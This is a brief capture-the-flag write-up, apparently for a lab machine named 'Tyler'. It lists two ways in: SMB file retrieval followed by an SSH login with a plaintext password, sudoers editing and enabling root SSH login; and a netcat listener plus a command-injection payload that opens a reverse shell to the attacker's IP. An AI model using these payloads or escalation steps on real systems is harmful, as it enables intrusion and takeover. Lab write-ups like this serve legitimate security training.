# Tyler
## Method 1
1. http://tyler.thm/upload or `smbclient ////tyler.thm//public` and `get alert.txt`
2. http://tyler.thm/betatest check for `narrator`
3. `ssh narrator@tyler.thm` password: `X8JEETQmf3hkS65f`
4. `vim /etc/sudoers` and add narrator to sudoers
5. `narrator ALL=(ALL) ALL`
6. `vim /etc/ssh/sshd_config` and `PermitRootLogin` no to yes.
## Method 2
1. http://tyler.thm/betatest
2. `nc -nvlp 8888` on kali
3. `tdurden;sh -i >& /dev/tcp/10.8.85.10/8888 0>&1` to betatest



## Exploit 
https://www.exploit-db.com/exploits/47044
